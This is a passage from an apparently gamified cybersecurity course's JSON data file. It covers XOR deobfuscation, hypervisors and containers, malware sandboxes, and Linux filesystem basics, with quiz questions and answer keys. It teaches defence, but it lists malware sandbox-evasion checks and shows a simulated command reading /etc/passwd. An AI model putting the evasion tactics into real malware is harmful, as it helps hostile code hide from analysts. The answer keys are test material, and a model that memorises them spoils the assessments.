        "concept": "Computers only store numbers; character encoding schemes define how numeric values map to human-readable text characters.\n\n- ASCII (American Standard Code for Information Interchange): A 7-bit encoding standard established in 1963, representing 128 characters (codes 0 to 127). It defines control codes (0\u201331), uppercase letters (0x41 'A' to 0x5A 'Z'), lowercase letters (0x61 'a' to 0x7A 'z'), and numbers (0x30 '0' to 0x39 '9').\n- UTF-8 (Unicode Transformation Format): A backward-compatible, variable-length encoding system using 1 to 4 bytes per character. Standard ASCII characters occupy exactly 1 byte with identical byte values, while international characters, symbols, and emojis occupy 2 to 4 bytes.\n\nEndianness describes the byte order in which multi-byte integers are stored in physical computer memory:\n- Little-Endian: The least significant byte (LSB) is stored at the lowest memory address. Used by x86 and ARM processors.\n- Big-Endian (Network Byte Order): The most significant byte (MSB) is stored at the lowest memory address. Used across standard Internet protocols (TCP/IP packet headers).\n\nFor example, the 32-bit hex integer 0xAABBCCDD stored at address 0x1000:\n- Little-Endian: [0x1000]=0xDD, [0x1001]=0xCC, [0x1002]=0xBB, [0x1003]=0xAA\n- Big-Endian:    [0x1000]=0xAA, [0x1001]=0xBB, [0x1002]=0xCC, [0x1003]=0xDD",
        "whyItMatters": "Understanding byte ordering (Little vs Big Endian) is essential when inspecting network packets with Wireshark or reverse engineering binary executables in GDB.",
        "examples": [
          "ASCII 0x41 = Decimal 65 = Capital letter 'A'",
          "Network Byte Order is strictly Big-Endian per RFC 791."
        ],
        "commands": [
          {
            "cmd": "man ascii",
            "desc": "Display the standard octal, decimal, and hexadecimal ASCII lookup table in Linux"
          }
        ],
        "exercise": {
          "prompt": "Print the character representation of ASCII hex 0x43 (decimal 67) in Python:",
          "command": "python3 -c 'print(chr(0x43))'",
          "expectedOutput": "C"
        },
        "reviewSummary": {
          "coreTakeaway": "Data representation bridges raw binary memory with human text; Little-Endian governs x86 processors while Big-Endian governs network protocols.",
          "learningOutcome": "Understood character encoding systems and multi-byte memory endianness."
        }
      },
      {
        "id": "ps-task-02-04",
        "taskNumber": 4,
        "title": "Scripting Bitwise Operations & Masks in Python",
        "objectives": [
          "Apply bitwise AND with masks to extract specific bitfields from flags",
          "Use bitwise shift operators (<< and >>) for rapid multiplication and division",
          "Write simple Python scripts to obfuscate and de-obfuscate payloads using XOR keys"
        ],
        "concept": "In cybersecurity automation, security engineers frequently need to parse binary flags embedded within network headers, file formats, and malware payloads. Python makes bitwise manipulation straightforward using native operators:\n\n- Bitwise AND (&) with Bitmasks: Suppose a byte represents 8 individual system security flags, where bit 2 indicates 'admin privileges' (binary mask 0b00000100 = 0x04). To test if admin privileges are enabled:\n  if user_flags & 0x04:\n      print('Admin flag set')\n\n- Bitwise Shifts (<< and >>):\n  - Left Shift (x << n): Shifts bits to the left, multiplying by 2^n (e.g., 5 << 1 = 10).\n  - Right Shift (x >> n): Shifts bits to the right, dividing by 2^n (e.g., 16 >> 2 = 4).\n\n- XOR Obfuscation Script:\n  Malware authors often obfuscate strings using a repeating single-byte XOR key. A defender can reverse this in Python:\n  def xor_bytes(data, key):\n      return bytes([b ^ key for b in data])\n\nBecause XOR is reversible, passing the encrypted output back through the same function with the same key instantly reveals the original text.",
        "whyItMatters": "Bitmasks and bitwise operators allow analysts to decode raw packet flags (TCP SYN/ACK) and decrypt single-byte XOR obfuscated malware strings with minimal code.",
        "examples": [
          "Extracting TCP flags: tcp_flags & 0x02 checks if the SYN flag bit is set.",
          "Deobfuscating malware: decrypting command-and-control IP addresses concealed with single-byte XOR."
        ],
        "commands": [
          {
            "cmd": "python3 -c 'print([chr(b ^ 0x55) for b in bytes([0x16, 0x34, 0x39, 0x3c, 0x3a, 0x3b])])'",
            "desc": "Deobfuscate a 6-byte XOR sequence using Python list comprehension"
          }
        ],
        "exercise": {
          "prompt": "Run a Python one-liner to perform a single-byte XOR deobfuscation test with key 0x20:",
          "command": "python3 -c 'print(bytes([0x63 ^ 0x20]).decode())'",
          "expectedOutput": "C"
        },
        "reviewSummary": {
          "coreTakeaway": "Python bitwise operators (&, |, ^, <<, >>) enable automated flag masking and fast XOR payload decryption.",
          "learningOutcome": "Mastered bitmask filtering and XOR automation scripts in Python."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-02-01",
        "taskId": "ps-task-02-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "How many binary bits are grouped together to form a single hexadecimal digit?",
        "canonicalAnswer": "4",
        "acceptedAnswers": [
          "4",
          "four",
          "4 bits"
        ],
        "visualSlots": "_",
        "answerLength": 1,
        "hints": [
          "Think about the binary values required to count from 0 to 15 (0 to F).",
          "Also known as a nibble."
        ],
        "hint": "Think about a nibble...",
        "explanation": "Each hexadecimal character represents exactly 4 bits (a nibble), allowing values from 0000 (0) to 1111 (15 / F).",
        "xp": 25
      },
      {
        "id": "ps-q-02-02",
        "taskId": "ps-task-02-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "Which bitwise logical operation outputs a 1 only when the two input bits differ, making it fundamental to symmetric ciphers?",
        "canonicalAnswer": "xor",
        "acceptedAnswers": [
          "xor",
          "XOR",
          "exclusive or",
          "Exclusive OR"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "It stands for Exclusive OR.",
          "3 letters."
        ],
        "hint": "Exclusive OR...",
        "explanation": "XOR (Exclusive OR) outputs 1 only when input bits are distinct. Because (A ^ B) ^ B = A, it is widely used in stream ciphers and one-time pads.",
        "xp": 25
      },
      {
        "id": "ps-q-02-03",
        "taskId": "ps-task-02-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "In internet networking protocols (such as IP headers), what byte order convention is universally defined as Network Byte Order?",
        "canonicalAnswer": "big endian",
        "acceptedAnswers": [
          "big endian",
          "big-endian",
          "Big Endian",
          "Big-Endian"
        ],
        "visualSlots": "_ _ _   _ _ _ _ _ _",
        "answerLength": 10,
        "hints": [
          "The most significant byte is transmitted and stored first.",
          "Opposite of Little Endian."
        ],
        "hint": "Most significant byte stored first...",
        "explanation": "Network Byte Order is standard Big-Endian: the most significant byte is transmitted and stored at the lowest memory address.",
        "xp": 25
      },
      {
        "id": "ps-q-02-04",
        "taskId": "ps-task-02-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "In Python, which operator symbol performs a bitwise XOR operation between two numbers?",
        "canonicalAnswer": "^",
        "acceptedAnswers": [
          "^",
          "caret"
        ],
        "visualSlots": "^",
        "answerLength": 1,
        "hints": [
          "It is the caret symbol found on key 6 of a standard US keyboard.",
          "Single punctuation character."
        ],
        "hint": "The caret punctuation mark on key 6...",
        "explanation": "In Python, the caret symbol (^) performs bitwise XOR between integers (e.g. 0x41 ^ 0x20 = 0x61).",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 02 Capstone Assessment: Bitwise Cryptanalysis Scenario",
      "scenario": "A security analyst captures an obfuscated byte 0x5A from a malicious malware beacon. Malware analysis reveals the malware author XOR-encrypted the byte using a static key of 0x3C.",
      "taskId": "ps-task-02-assessment",
      "question": {
        "id": "ps-q-02-capstone",
        "type": "exact",
        "question": "What is the decrypted original byte in hexadecimal format (e.g. 0x..)?",
        "canonicalAnswer": "0x66",
        "acceptedAnswers": [
          "0x66",
          "66",
          "0x66h"
        ],
        "visualSlots": "_ _ _ _",
        "answerLength": 4,
        "hints": [
          "Remember that (A ^ B) ^ B = A. Perform 0x5A ^ 0x3C.",
          "0x5A is 01011010; 0x3C is 00111100. XOR gives 01100110."
        ],
        "hint": "Perform 0x5A ^ 0x3C in hex...",
        "explanation": "0x5A (01011010) XOR 0x3C (00111100) = 01100110 in binary, which equals 0x66 in hexadecimal (ASCII 'f').",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-03",
    "legacyId": "room-03",
    "order": 3,
    "stageId": "ps-stage-01",
    "stageTitle": "Computing & Hardware Architecture",
    "stageOrder": 1,
    "title": "Virtualization, Hypervisors & Sandboxing",
    "tagline": "Type 1 vs Type 2 Hypervisors, VT-x, Namespaces & Containerization",
    "description": "Understand hardware isolation techniques: bare-metal Type 1 hypervisors, hosted Type 2 hypervisors, hardware-assisted virtualization (Intel VT-x / AMD-V), Linux container namespaces/cgroups, and malware detonation sandboxes.",
    "difficulty": "Foundational",
    "estimatedMinutes": 35,
    "xp": 50,
    "prerequisites": [
      "ps-room-02"
    ],
    "whyAreYouHere": "Modern cybersecurity relies entirely on virtualization for malware analysis detonation chambers, isolated lab targets, cloud infrastructure, and defensive honeytokens.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"260\" height=\"135\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"150\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Type 1 Hypervisor (Bare-Metal)</text><rect x=\"35\" y=\"60\" width=\"110\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"90\" y=\"85\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">VM 1 (Guest OS)</text><rect x=\"155\" y=\"60\" width=\"110\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"210\" y=\"85\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">VM 2 (Guest OS)</text><rect x=\"35\" y=\"110\" width=\"230\" height=\"30\" rx=\"4\" fill=\"#0284c7\" fill-opacity=\"0.2\" stroke=\"#0284c7\"/><text x=\"150\" y=\"130\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">Hypervisor on Physical HW</text><rect x=\"320\" y=\"20\" width=\"260\" height=\"135\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"450\" y=\"45\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Linux Containers (Namespaces)</text><rect x=\"335\" y=\"60\" width=\"110\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"390\" y=\"85\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Container 1 (App)</text><rect x=\"455\" y=\"60\" width=\"110\" height=\"40\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"510\" y=\"85\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Container 2 (App)</text><rect x=\"335\" y=\"110\" width=\"230\" height=\"30\" rx=\"4\" fill=\"#10b981\" fill-opacity=\"0.2\" stroke=\"#10b981\"/><text x=\"450\" y=\"130\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">Shared Host Linux Kernel</text></svg>",
    "tryInteractive": {
      "expectedCommand": "systemd-detect-virt",
      "simulatedOutput": "kvm"
    },
    "terminalCommands": [
      {
        "command": "systemd-detect-virt",
        "output": "kvm"
      },
      {
        "command": "docker --version",
        "output": "Docker version 24.0.7, build afdd53b"
      },
      {
        "command": "lsns -t pid",
        "output": "        NS TYPE NPROCS   PID USER COMMAND\n4026531836 pid     128     1 root /sbin/init"
      }
    ],
    "objectives": [
      "Contrast Type 1 (Bare-Metal) vs Type 2 (Hosted) hypervisors",
      "Explain hardware-assisted virtualization extensions (Intel VT-x / AMD-V)",
      "Understand container isolation via Linux namespaces and cgroups",
      "Identify malware sandbox evasion tactics and VM escape mitigations"
    ],
    "lessons": [
      {
        "id": "ps-task-03-01",
        "taskNumber": 1,
        "title": "Hypervisors: Type 1 (Bare Metal) vs Type 2 (Hosted)",
        "objectives": [
          "Distinguish between Type 1 (bare-metal) and Type 2 (hosted) hypervisors",
          "Explain the role of hardware virtualization extensions (Intel VT-x and AMD-V)",
          "Analyze the security implications of hypervisor isolation"
        ],
        "concept": "Virtualization allows multiple isolated guest operating systems to execute simultaneously on a single set of physical hardware components. The software responsible for managing this abstraction is called a Hypervisor or Virtual Machine Monitor (VMM).\n\nHypervisors fall into two distinct architectural classes:\n- Type 1 (Bare-Metal) Hypervisors: Install and execute directly on physical server hardware without a underlying host operating system. Examples: VMware ESXi, Proxmox VE, Microsoft Hyper-V, and Linux KVM. Because there is no general-purpose host OS overhead or intermediary, Type 1 hypervisors offer high performance, minimal attack surface, and enterprise-grade security isolation.\n- Type 2 (Hosted) Hypervisors: Execute as application processes inside a conventional host operating system (such as Windows, macOS, or Ubuntu). Examples: VMware Workstation, Oracle VirtualBox, and UTM. The guest OS must pass hardware instructions through both the hypervisor application and the host OS kernel, introducing latency and an expanded attack surface.\n\nModern CPUs provide Hardware-Assisted Virtualization (Intel VT-x and AMD-V), creating CPU privilege rings below Ring 0 (often called 'Ring -1' or VMX Root Mode) that allow hypervisors to intercept sensitive guest CPU instructions without software binary translation.",
        "whyItMatters": "Type 1 hypervisors power cloud infrastructure (AWS, Azure) and enterprise security labs; understanding their architecture is crucial for cloud security audits.",
        "examples": [
          "Type 1 Hypervisors: VMware ESXi, KVM, Xen, Microsoft Hyper-V Server.",
          "Type 2 Hypervisors: VirtualBox, VMware Workstation, Parallels Desktop."
        ],
        "commands": [
          {
            "cmd": "egrep -c '(vmx|svm)' /proc/cpuinfo",
            "desc": "Check if CPU hardware virtualization support is enabled (vmx = Intel VT-x, svm = AMD-V)"
          },
          {
            "cmd": "systemd-detect-virt",
            "desc": "Detect if current environment is running inside a VM or container"
          }
        ],
        "exercise": {
          "prompt": "Run 'systemd-detect-virt' in the sandbox terminal to check virtualization detection:",
          "command": "systemd-detect-virt",
          "expectedOutput": "kvm"
        },
        "reviewSummary": {
          "coreTakeaway": "Type 1 hypervisors run directly on hardware with minimal attack surface; Type 2 hypervisors execute atop a host OS.",
          "learningOutcome": "Mastered Type 1 vs Type 2 hypervisors and hardware virtualization."
        }
      },
      {
        "id": "ps-task-03-02",
        "taskNumber": 2,
        "title": "Containers vs Virtual Machines (Namespaces & Cgroups)",
        "objectives": [
          "Contrast VM hardware virtualization with container OS-level virtualization",
          "Define the 7 primary Linux namespaces (PID, NET, MNT, IPC, UTS, USER, CGROUP)",
          "Explain how Control Groups (cgroups) throttle and meter physical CPU/memory resources"
        ],
        "concept": "While Virtual Machines virtualize the entire physical hardware stack (each running an independent guest OS kernel, virtual BIOS, and virtual disks), Containers provide lightweight Operating System-Level Virtualization.\n\nContainers do not run independent kernels; all containers share the single underlying host Linux kernel. Isolation between containers is enforced entirely by two native Linux kernel features:\n\n1. Namespaces (Visibility Isolation): Restricts what a process can SEE.\n- PID Namespace: Process IDs are isolated; a containerized process can be PID 1 inside its container while mapped to PID 14285 on the host.\n- NET Namespace: Dedicated virtual network interfaces, routing tables, and firewall rules.\n- MNT Namespace: Isolated filesystem mount points (preventing access to host root /).\n- USER Namespace: Maps root (UID 0) inside container to an unprivileged UID (e.g. 10001) on the host.\n- UTS Namespace: Isolated hostname and domain name.\n- IPC Namespace: Isolated shared memory and message queues.\n\n2. Control Groups / cgroups (Resource Metering): Restricts how much a process can USE.\n- Enforces hard quotas on CPU core usage, maximum RAM allocation, disk I/O throughput, and maximum process counts (pids.max) to prevent denial-of-service (fork bombs).",
        "whyItMatters": "Because containers share the host kernel, a kernel vulnerability (e.g. Dirty COW) allows an attacker to break out of a container directly into root on the host machine.",
        "examples": [
          "VM isolation boundary: Hypervisor / Hardware boundary (strongest).",
          "Container isolation boundary: Kernel namespaces and system call filters (seccomp)."
        ],
        "commands": [
          {
            "cmd": "lsns",
            "desc": "List all active Linux kernel namespaces on the system"
          },
          {
            "cmd": "ps -ef --forest",
            "desc": "Inspect parent-child process relationships across namespaces"
          }
        ],
        "exercise": {
          "prompt": "Inspect active PID namespaces using 'lsns -t pid':",
          "command": "lsns -t pid",
          "expectedOutput": "        NS TYPE NPROCS   PID USER COMMAND\n4026531836 pid     128     1 root /sbin/init"
        },
        "reviewSummary": {
          "coreTakeaway": "Containers share the host kernel using namespaces (isolation) and cgroups (limits); VMs emulate full hardware with independent kernels.",
          "learningOutcome": "Understood container namespaces, cgroups, and container escape risks."
        }
      },
      {
        "id": "ps-task-03-03",
        "taskNumber": 3,
        "title": "Sandboxing, Isolation & Malware Analysis Environments",
        "objectives": [
          "Explain how security teams utilize isolated detonation chambers to analyze untrusted software",
          "Define VM snapshots and explain rollback procedures after dynamic malware execution",
          "Identify common sandbox evasion techniques used by advanced malware"
        ],
        "concept": "A Sandbox is an isolated execution environment designed to detonate and observe untrusted files, attachments, and URLs without exposing production networks to risk.\n\nKey Components of a Malware Analysis Sandbox (e.g., Cuckoo Sandbox, CAPE):\n1. Ephemeral Virtual Machines: Guest VMs running Windows or Linux with monitoring agents.\n2. Hypervisor Snapshotting: Prior to detonation, a clean VM snapshot is created. Once malware is executed and behavioral telemetry (API calls, network beacons, dropped files) is captured, the VM is instantly discarded and reverted to the pristine snapshot.\n3. Network Simulation (FakeNet / INetSim): Fakes common internet services (DNS, HTTP, SMTP) to log malware C2 traffic without allowing the sample to actually communicate with the real internet.\n\nMalware Sandbox Evasion Tactics:\nSophisticated malware actively checks if it is running inside a virtualized sandbox before activating its payload:\n- Artifact Checks: Querying MAC address vendor prefixes (e.g., VMware 00:05:69, VirtualBox 08:00:27) or registry keys.\n- Environmental Checks: Checking if screen resolution is under 1024x768, if RAM is less than 4GB, or if CPU cores equal 1.\n- Human Interaction Checks: Checking for mouse movements, recent files in user documents, or delaying execution for 30 minutes to exceed sandbox timeouts.",
        "whyItMatters": "Understanding sandbox evasion enables defenders to harden analysis chambers with realistic human artifacts and detect stealthy malware campaigns.",
        "examples": [
          "Snapshot Reversion: Reverting an infected VM back to a known-good clean state in under 5 seconds.",
          "Sandbox Evasion: Malware executing 'cpuid' instruction to check hypervisor presence bit."
        ],
        "commands": [
          {
            "cmd": "grep -i hypervisor /proc/cpuinfo",
            "desc": "Check for hypervisor flag exposed in CPU feature flags"
          }
        ],
        "exercise": {
          "prompt": "Check if a hypervisor CPU flag is detected in /proc/cpuinfo:",
          "command": "grep -i hypervisor /proc/cpuinfo",
          "expectedOutput": "flags           : ... hypervisor ..."
        },
        "reviewSummary": {
          "coreTakeaway": "Sandboxes use isolated snapshotting VMs to detonate untrusted code safely; analysts must harden sandboxes against evasion detection.",
          "learningOutcome": "Mastered malware detonation chambers, snapshot lifecycles, and anti-analysis evasion tactics."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-03-01",
        "taskId": "ps-task-03-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which type of hypervisor installs and executes directly onto the physical server hardware without a host OS?",
        "canonicalAnswer": "type 1",
        "acceptedAnswers": [
          "type 1",
          "type-1",
          "bare metal",
          "Type 1",
          "Type-1",
          "bare-metal"
        ],
        "visualSlots": "_ _ _ _   _",
        "answerLength": 6,
        "hints": [
          "It is also called a bare-metal hypervisor.",
          "Type 1 or Type 2?"
        ],
        "hint": "Bare-metal hypervisor classification...",
        "explanation": "Type 1 hypervisors (such as ESXi, KVM, and Hyper-V Server) execute directly on physical server hardware, eliminating host OS overhead and reducing attack surface.",
        "xp": 25
      },
      {
        "id": "ps-q-03-02",
        "taskId": "ps-task-03-02",
        "taskIndex": 1,
        "type": "choice",
        "question": "Which Linux kernel feature is specifically responsible for metering and limiting CPU, memory, and I/O resource consumption for containers?",
        "options": [
          "Linux Namespaces",
          "Control Groups (cgroups)",
          "Chroot Jails",
          "AppArmor Profiles"
        ],
        "correctIndex": 1,
        "hints": [
          "Namespaces handle isolation/visibility; this feature handles resource metering.",
          "Abbreviated as cgroups."
        ],
        "hint": "Abbreviated as cgroups...",
        "explanation": "Control Groups (cgroups) allocate, throttle, and meter physical hardware resources (CPU, memory, disk I/O) among process hierarchies.",
        "xp": 25
      },
      {
        "id": "ps-q-03-03",
        "taskId": "ps-task-03-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "What virtualization feature allows malware analysts to instantly revert a compromised virtual machine back to a clean state after detonation?",
        "canonicalAnswer": "snapshot",
        "acceptedAnswers": [
          "snapshot",
          "snapshots",
          "Snapshot",
          "Snapshots"
        ],
        "visualSlots": "_ _ _ _ _ _ _ _",
        "answerLength": 8,
        "hints": [
          "A point-in-time image of the VM's disk and memory state.",
          "Starts with 'snap'."
        ],
        "hint": "Point-in-time VM state image...",
        "explanation": "A VM snapshot records the disk and memory state of a machine at a specific point in time, allowing instant reversion after executing untrusted malware.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 03 Capstone Assessment: Architecture & Isolation Analysis",
      "scenario": "A security operations team must deploy an automated malware detonation chamber to execute high-risk untrusted executables. The team is evaluating Docker containers sharing the host kernel vs Type 1 virtual machines.",
      "taskId": "ps-task-03-assessment",
      "question": {
        "id": "ps-q-03-capstone",
        "type": "choice",
        "question": "Why are Type 1 Virtual Machines preferred over shared-kernel containers for detonating unknown malware?",
        "options": [
          "Containers consume significantly more memory than VMs",
          "Malware exploiting a kernel vulnerability in a container can directly compromise the host kernel, whereas VMs run isolated kernels",
          "Containers cannot execute compiled x86 binaries",
          "VMs execute without hardware CPU extensions"
        ],
        "correctIndex": 1,
        "hints": [
          "Consider the fundamental boundary difference between container isolation (shared kernel) and hypervisor isolation (independent kernels).",
          "What happens if malware triggers a privilege escalation kernel exploit inside a container?"
        ],
        "hint": "Containers share the host kernel...",
        "explanation": "Because containers share the host operating system kernel, any zero-day kernel exploit allows malware to escape the container into the host. VMs run completely independent guest kernels behind hypervisor hardware isolation.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-04",
    "legacyId": "room-04",
    "order": 4,
    "stageId": "ps-stage-02",
    "stageTitle": "Operating Systems & System Internals",
    "stageOrder": 2,
    "title": "Linux Filesystem Hierarchy & Permission Architecture",
    "tagline": "FHS Standard, Inodes, Octal Permissions, SUID & User/Group Management",
    "description": "Master the Linux unified filesystem hierarchy: the Filesystem Hierarchy Standard (FHS), inode metadata, user and group management, read/write/execute permissions, octal masks, and privileged SUID bits.",
    "difficulty": "Foundational",
    "estimatedMinutes": 35,
    "xp": 50,
    "prerequisites": [
      "ps-room-03"
    ],
    "whyAreYouHere": "Linux powers over 90% of the world's public cloud servers and security tooling. Mastering its filesystem architecture and permissions is essential for privilege escalation analysis and system hardening.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"250\" y=\"15\" width=\"100\" height=\"35\" rx=\"6\" fill=\"#1e293b\" stroke=\"#6366f1\" stroke-width=\"2\"/><text x=\"300\" y=\"38\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">/ (Root)</text><line x1=\"300\" y1=\"50\" x2=\"300\" y2=\"70\" stroke=\"#475569\" stroke-width=\"2\"/><line x1=\"60\" y1=\"70\" x2=\"540\" y2=\"70\" stroke=\"#475569\" stroke-width=\"2\"/><line x1=\"60\" y1=\"70\" x2=\"60\" y2=\"90\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"15\" y=\"90\" width=\"90\" height=\"60\" rx=\"6\" fill=\"#0f172a\" stroke=\"#0284c7\"/><text x=\"60\" y=\"112\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">/bin, /sbin</text><text x=\"60\" y=\"132\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Executables</text><line x1=\"180\" y1=\"70\" x2=\"180\" y2=\"90\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"135\" y=\"90\" width=\"90\" height=\"60\" rx=\"6\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"180\" y=\"112\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">/etc</text><text x=\"180\" y=\"132\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Configuration</text><line x1=\"300\" y1=\"70\" x2=\"300\" y2=\"90\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"255\" y=\"90\" width=\"90\" height=\"60\" rx=\"6\" fill=\"#0f172a\" stroke=\"#f59e0b\"/><text x=\"300\" y=\"112\" fill=\"#fbbf24\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">/var/log</text><text x=\"300\" y=\"132\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Audit Logs</text><line x1=\"420\" y1=\"70\" x2=\"420\" y2=\"90\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"375\" y=\"90\" width=\"90\" height=\"60\" rx=\"6\" fill=\"#0f172a\" stroke=\"#a855f7\"/><text x=\"420\" y=\"112\" fill=\"#c084fc\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">/proc, /sys</text><text x=\"420\" y=\"132\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Kernel State</text><line x1=\"540\" y1=\"70\" x2=\"540\" y2=\"90\" stroke=\"#475569\" stroke-width=\"2\"/><rect x=\"495\" y=\"90\" width=\"90\" height=\"60\" rx=\"6\" fill=\"#0f172a\" stroke=\"#ef4444\"/><text x=\"540\" y=\"112\" fill=\"#f87171\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">/tmp</text><text x=\"540\" y=\"132\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Ephemeral</text></svg>",
    "tryInteractive": {
      "expectedCommand": "ls -ld /tmp",
      "simulatedOutput": "drwxrwxrwt 14 root root 4096 Nov 19 03:00 /tmp"
    },
    "terminalCommands": [
      {
        "command": "ls -ld /tmp",
        "output": "drwxrwxrwt 14 root root 4096 Nov 19 03:00 /tmp"
      },
      {
        "command": "cat /etc/passwd | head -n 3",
        "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin"
      },
      {
        "command": "id",
        "output": "uid=1000(cadet) gid=1000(cadet) groups=1000(cadet),27(sudo),100(users)"
      }
    ],
    "objectives": [
      "Navigate the Linux Filesystem Hierarchy Standard (FHS) directories",
      "Calculate and interpret octal permissions (e.g. 755, 644, 700)",
      "Identify special permission bits: SUID, SGID, and Sticky Bit",
      "Manage Linux users, groups, and file ownership (/etc/passwd and /etc/shadow)"
    ],
    "lessons": [
      {
        "id": "ps-task-04-01",
        "taskNumber": 1,
        "title": "The Linux Filesystem Hierarchy Standard (FHS)",
        "objectives": [
          "Explain the single unified directory tree anchored at / (root)",
          "Identify the distinct security roles of /bin, /etc, /var/log, /proc, and /tmp",
          "Distinguish between physical storage directories and kernel pseudo-filesystems"
        ],
        "concept": "Unlike Windows, which assigns distinct drive letters (C:, D:) to physical partitions, Linux organizes all storage under a single inverted directory tree beginning at the root directory: /.\n\nThe Filesystem Hierarchy Standard (FHS) defines the mandatory directory layout:\n- /bin & /usr/bin: Essential user command binaries (ls, cat, bash).\n- /sbin & /usr/sbin: System administrative binaries intended for root (iptables, fdisk, reboot).\n- /etc: Host-specific static configuration files (passwd, shadow, ssh/sshd_config).\n- /var/log: Variable runtime log files recording system audits, auth attempts, and service states.\n- /tmp: World-writable ephemeral temporary files (often utilized by attackers for initial dropper execution).\n- /proc: A virtual pseudo-filesystem generated in-memory by the Linux kernel. It exposes real-time hardware status and active process data (e.g. /proc/cpuinfo, /proc/[PID]/cmdline).\n- /home: Dedicated personal storage for non-root user accounts.",
        "whyItMatters": "Understanding FHS allows incident responders to immediately locate compromised binaries, configuration files, and persistence locations during an intrusion.",
        "examples": [
          "/etc/passwd: World-readable file containing system user accounts, shell assignments, and UIDs.",
          "/proc/sys/net/ipv4/ip_forward: Kernel switch enabling or disabling packet forwarding."
        ],
        "commands": [
          {
            "cmd": "ls -la /",
            "desc": "List all root directories, permission strings, and ownership metadata"
          },
          {
            "cmd": "cat /proc/version",
            "desc": "Inspect kernel compile information from the virtual proc pseudo-filesystem"
          }
        ],
        "exercise": {
          "prompt": "Inspect the root directory structure using 'ls -d /* | head -n 8':",
          "command": "ls -d /* | head -n 8",
          "expectedOutput": "/bin\n/boot\n/dev\n/etc\n/home\n/lib\n/proc\n/root"
        },
        "reviewSummary": {
          "coreTakeaway": "All Linux files exist under a unified tree; virtual directories like /proc expose real-time kernel memory state.",
          "learningOutcome": "Mastered Linux FHS directory layout and pseudo-filesystems."
        }
      },
      {
        "id": "ps-task-04-02",
        "taskNumber": 2,
        "title": "File Permissions: Symbolic, Octal & Special Bits (SUID)",
        "objectives": [
          "Deconstruct 10-character Linux permission strings into Type, Owner, Group, and Others",
          "Calculate numeric octal permission values (Read=4, Write=2, Execute=1)",
          "Explain the security hazard of SUID binaries (chmod 4755)"
        ],
